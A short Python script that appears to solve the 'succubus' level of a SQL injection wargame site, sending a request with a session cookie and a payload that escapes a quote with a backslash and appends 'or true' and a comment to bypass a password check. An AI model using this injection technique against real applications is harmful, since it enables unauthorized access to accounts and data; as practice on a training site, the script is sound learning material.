import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php"
cookies = {'PHPSESSID': session_id}

payload = '?id=\&pw=or true %23'
url += payload
response = requests.get(url, cookies=cookies)
print_html(response.text)
